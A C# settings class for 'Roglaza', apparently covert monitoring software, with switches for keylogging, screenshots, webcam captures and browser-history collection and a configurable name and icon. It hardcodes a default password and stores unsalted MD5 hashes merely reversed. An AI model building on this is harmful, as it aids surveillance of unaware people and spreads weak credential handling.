using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Roglaza
{
   public enum GeneralErros 
   {
       Not_found 
   }
   public enum RoglazaSettingsParameters
   {
       password, GeneralSettingsFilePath, WaitInPasswordFailed
   }
   public class RoglazaSettings
    {
       public string GeneralSettingsFilePath = "config.rog";
       public static string DefaultPassword = "weloveyou";
       public int WaitInPasswordFailed = 60;
       public int ScreenShotInterValMinutes = 5;
       public bool Loaded = false;
       public bool AllowKeyLogger = true;
       public bool AllowScreenShots = true;
       public bool AllowCamShots = true;
       public bool AllowBrowserHistory = true;
       public bool ShouldBewrittenToFile = true;

       public RoglazaSettings()
       {
           GeneralSettingsFilePath = RoglazaHelper.GetRoglazaAPPDataPath() + "//config.rog";
       }

       public RoglazaSettings(bool p)
       {
           ShouldBewrittenToFile = p;
       }
       public bool LoadFromFile()
       {
           //Load settings from file as text
           try
           {
               string data=  RoglazaHelper.ReadTextFile(Program.ProgramSettings.GeneralSettingsFilePath);
               if (data == GeneralErros.Not_found.ToString())
                   return false;
               else
               {
                  return TranslateSettings(data);              
               }
           }
           catch
           {
               return false;
           }
       }
       private bool TranslateSettings(string data)
       {
           // unserializing text settings
           if (data.Contains("\n"))
           {
               string[] lines = data.Split('\n');
               foreach (string l in lines)
               {
                   if (!l.Contains(":"))
                       continue;
                   string[] key_value = l.Split(':');
                   string key = key_value[0].Trim();
                   string value = key_value[1].Trim();
                   switch (key)
                   {
                       case "RoglazaName":
                       case "roglazaname": RoglazaName = Decode(value); break;
                       case "allowbrowserhistory":
                       case "AllowBrowserHistory": AllowBrowserHistory = RoglazaHelper.ReverseToBoolean(value); break;
                       case "allowcamshots":
                       case "AllowCamShots": AllowCamShots = RoglazaHelper.ReverseToBoolean(value); break;
                       case "allowkeylogger":
                       case "AllowKeyLogger": AllowKeyLogger = RoglazaHelper.ReverseToBoolean(value); break;
                       case "allowscreenshots":
                       case "AllowScreenShots": AllowScreenShots = RoglazaHelper.ReverseToBoolean(value); break;
                       case "RoglazaIconPath":
                       case "roglazaiconpath": RoglazaIconPath = Decode(value); break;
                       case "generalsettingsfilepath":
                       case "GeneralSettingsFilePath": GeneralSettingsFilePath = Decode(value); break;
                       case "password":
                       case "key":
                       case "access":
                       case "credit":
                           {
                               if (value == "") 
                                   value = Crypter.GetMd5Hash(DefaultPassword);
                               else
                                   PasswordHash = RoglazaHelper.ReverseText(value);
                               break;
                           }
                       case "WaitInPasswordFailed":
                       case "waitinpasswordfailed": WaitInPasswordFailed = RoglazaHelper.TextToInt(value, 60); break;
                       case "ScreenShotInterValMinutes":
                       case "screenshotIntervalminutes": ScreenShotInterValMinutes = RoglazaHelper.TextToInt(value, 5); break;
                   }

               }

               return true;
           }
           else return false;
       }
       public bool SaveSettings()
       {
           if (ShouldBewrittenToFile == false)
               return false;
           string revHash = RoglazaHelper.ReverseText(PasswordHash);
           string data = "";
           data += "GeneralSettingsFilePath:" + Encode(GeneralSettingsFilePath)+"\r\n";
           data += "key:" + revHash + "\r\n";
           data += "WaitInPasswordFailed:" + WaitInPasswordFailed.ToString() + "\r\n";
           data += "ScreenShotInterValMinutes:" + ScreenShotInterValMinutes.ToString()+"\n\r";
           data += "AllowBrowserHistory:" + AllowBrowserHistory + "\r\n";
           data += "AllowCamShots:" + AllowCamShots + "\r\n";
           data += "AllowKeyLogger:" + AllowKeyLogger + "\r\n";
           data += "AllowScreenShots:" + AllowScreenShots + "\r\n";
           data += "RoglazaIconPath:" + Encode(RoglazaIconPath)+"\r\n";
           data += "RoglazaName:" + RoglazaName + "\r\n";
           return RoglazaHelper.FileWriteText(GeneralSettingsFilePath, data);         
            
       }

       private  static string Encode(string s)
       {
           return s.Replace(":", "$COLON$");
       }
       private static string Decode(string s)
       {
           return s.Replace("$COLON$",":");
       }
       public string PasswordHash =Crypter.GetMd5Hash(DefaultPassword);
       public static string ConvertTextPasswordToRevHash(string s)
       {
           string hash = Crypter.GetMd5Hash(s);
           hash = RoglazaHelper.ReverseText(hash);
           return hash;
       }
       internal void SETScreenShotInterValMinutes(int p)
       {
           this.ScreenShotInterValMinutes = p;
           SaveSettings();
       }

       public string RoglazaIconPath = "";

       public string RoglazaName ="Roglaza";
    }
}
